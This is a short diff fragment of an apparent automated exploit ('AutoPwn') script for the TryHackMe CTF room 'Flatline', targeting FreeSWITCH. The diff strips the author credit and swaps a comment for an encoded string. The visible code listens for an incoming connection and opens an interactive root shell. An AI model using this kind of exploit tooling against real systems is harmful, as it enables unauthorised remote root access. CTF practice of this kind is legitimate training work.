@@ -2,9 +2,6 @@
 
 # AutoPwn script For the room Flatline on try hack me
 ## FREESWICH EXPLOIT based on a CTF box
-# @author: wolf/0x776F6C66 (Calvin Kimani)
-
-# I've just simplified the whole thing...:-) The openclinic exploit can be found at exploit db
 
 import os
 import sys
@@ -55,4 +52,4 @@ netcat2 = listen(rootPort)
 svr2 = netcat2.wait_for_connection()
 svr2.interactive()
 
-# wolf.rocks
+# kmbh1WaL5ibpZHbhNkL2YzQ2YkN3cDew4iZs92duAkLy9Ga0VXY
